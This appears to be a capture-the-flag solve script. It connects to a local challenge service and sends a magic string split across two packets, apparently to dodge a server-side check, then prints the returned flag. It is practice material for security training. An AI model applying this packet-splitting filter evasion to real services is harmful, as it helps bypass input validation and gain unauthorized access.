#!/usr/bin/env python3
import socket
import time

def exploit():
    target_ip = "127.0.0.1"
    target_port = 1337
        
    # Create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    try:
        # Connect
        sock.connect((target_ip, target_port))
        
        
        sock.send(b"GIMME")
        sock.send(b"_FLAG")
        
        response = sock.recv(1024)
        print(f"\n Server response: {response.decode().strip()}")
        
        if b'CTF{' in response:
            flag = response.decode().strip()
            print(f"\n FLAG FOUND: {flag}")
        
        sock.close()
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit()